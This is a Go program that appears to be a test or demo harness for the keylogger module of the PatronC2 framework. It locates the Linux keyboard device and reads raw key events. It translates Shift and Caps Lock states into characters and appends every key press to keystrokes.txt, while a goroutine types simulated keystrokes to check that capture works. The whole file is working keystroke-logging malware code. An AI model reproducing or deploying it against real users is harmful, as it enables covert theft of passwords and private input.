package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/PatronC2/linux-keylogger-1/keylogger"
	"github.com/PatronC2/Patron/lib/logger"
)

func main() {
	enableLogging := true
	logger.EnableLogging(enableLogging)

	logFileName := "keylogger.log"
	err := logger.SetLogFile(logFileName)
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
		return
	}

	// Open file for key logging
	keyLogFile, err := os.OpenFile("keystrokes.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logger.Logf(logger.Error, "error opening file: %v", err)
		return
	}
	defer keyLogFile.Close()

	writer := bufio.NewWriter(keyLogFile) // Buffered writer for efficiency
	defer writer.Flush()

	// Find keyboard device
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) == 0 {
		logger.Logf(logger.Error, "no keyboard found...you will need to provide manual input path")
		return
	}

	logger.Logf(logger.Info, "Found a keyboard at %v", keyboard)

	// Initialize keylogger
	k, err := keylogger.New(keyboard)
	if err != nil {
		logger.Logf(logger.Error, "error: %v", err)
		return
	}
	defer k.Close()

	// Simulate typing "Patron" with ENTER after 5 seconds
	go func() {
		time.Sleep(5 * time.Second)
		keys := []string{"L_SHIFT", "p", "i", "L_SHIFT", "z", "z", "a", "BS", "BS", "BS", "BS", "a", "t", "r", "o", "n", "ENTER", 
			"CAPS_LOCK", "i", "s", "SPACE", "k", "i", "n", "g", "R_SHIFT", "1", "R_SHIFT", "CAPS_LOCK", "L_SHIFT", "1", "L_SHIFT", "ENTER"}
		shiftActive := false
	
		for _, key := range keys {
			logger.Logf(logger.Info, "Typing: %v", key)
	
			// Handle Shift key properly
			if key == "L_SHIFT" || key == "R_SHIFT" {
				if !shiftActive {
					k.Write(keylogger.KeyPress, key) // Press Shift and hold it
					shiftActive = true
				} else {
					k.Write(keylogger.KeyRelease, key) // Release Shift
					shiftActive = false
				}
				continue
			}
	
			k.WriteOnce(key) // ✅ Type the letter
	
			// If Shift is active, do NOT release it until explicitly toggled off
		}
	}()	

	events := k.Read()

	// Track Shift and Caps Lock states
	shiftActive := false
	capsLockActive := false

	// Shift mapping for special characters
	shiftMappings := map[string]string{
		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
		"`": "~",
	}

	for e := range events {
		switch e.Type {
		case keylogger.EvKey:
			keyStr := e.KeyString()

			// Handle Shift Key (Track State for Press & Release)
			if keyStr == "L_SHIFT" || keyStr == "R_SHIFT" {
				shiftActive = e.KeyPress() // Shift is active only when pressed
				continue // Don't log shift key
			}

			// Handle Caps Lock (Toggle State)
			if keyStr == "CAPS_LOCK" && e.KeyPress() {
				capsLockActive = !capsLockActive // Toggle state when pressed
				continue // Don't log Caps Lock key
			}

			// Process only key presses
			if e.KeyPress() {
				// Handle Special Keys First
				switch keyStr {
				case "SPACE":
					writer.WriteString(" ") // Write space
				case "ENTER":
					writer.WriteString("\n") // Write newline
				case "TAB":
					writer.WriteString("\t") // Write tab
				case "BS", "BACKSPACE":
					// Read current content and remove last character if possible
					writer.Flush()
					fileContent, _ := os.ReadFile("keystrokes.txt")
					if len(fileContent) > 0 {
						fileContent = fileContent[:len(fileContent)-1] // Remove last char
						_ = os.WriteFile("keystrokes.txt", fileContent, 0644)
					}
				default:
					// Determine if Shift should modify the key
					if shiftActive {
						if shiftedKey, exists := shiftMappings[keyStr]; exists {
							keyStr = shiftedKey // Convert numbers/symbols with Shift
						} else if len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
							keyStr = strings.ToUpper(keyStr) // Convert lowercase letters to uppercase
						}
					} else {
						// Apply Caps Lock only to letters
						if capsLockActive && len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
							keyStr = strings.ToUpper(keyStr) // Convert lowercase to uppercase
						} else if !capsLockActive && len(keyStr) == 1 && keyStr >= "A" && keyStr <= "Z" {
							keyStr = strings.ToLower(keyStr) // Convert uppercase to lowercase when Caps Lock is OFF
						}
					}

					writer.WriteString(keyStr)
				}

				// Flush to ensure data is written immediately
				writer.Flush()
			}
		}
	}

}